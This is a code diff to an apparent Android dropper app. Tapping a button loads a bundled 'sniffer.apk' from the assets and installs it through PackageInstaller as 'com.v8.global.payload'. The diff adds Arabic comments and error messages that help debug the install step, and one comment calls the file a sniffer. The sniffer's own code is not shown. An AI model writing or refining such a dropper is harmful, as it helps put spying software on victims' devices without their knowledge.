@@ -7,6 +7,7 @@ import android.content.pm.PackageInstaller;
 import android.os.Bundle;
 import android.view.View;
 import android.widget.Button;
+import android.widget.Toast;
 import androidx.appcompat.app.AppCompatActivity;
 import java.io.InputStream;
 import java.io.OutputStream;
@@ -23,10 +24,13 @@ public class MainActivity extends AppCompatActivity {
             @Override
             public void onClick(View v) {
                 try {
+                    // محاولة فتح ملف القناص من مجلد assets
                     InputStream is = getAssets().open("sniffer.apk");
                     installPackage(MainActivity.this, is, "com.v8.global.payload");
                 } catch (Exception e) {
                     e.printStackTrace();
+                    // إذا الملف ماموجود أو اكو خطأ بالقراءة، تطلع هاي الرسالة
+                    Toast.makeText(MainActivity.this, "خطأ بالملف: " + e.getMessage(), Toast.LENGTH_LONG).show();
                 }
             }
         });
@@ -55,8 +59,11 @@ public class MainActivity extends AppCompatActivity {
             PendingIntent pendingIntent = PendingIntent.getActivity(context, 0, intent, PendingIntent.FLAG_MUTABLE);
             session.commit(pendingIntent.getIntentSender());
             session.close();
+            
         } catch (Exception e) {
             e.printStackTrace();
+            // إذا النظام رفض التثبيت أو صارت مشكلة بالـ Session، تطلع هاي الرسالة
+            Toast.makeText(context, "خطأ بالتثبيت: " + e.getMessage(), Toast.LENGTH_LONG).show();
         }
     }
 }
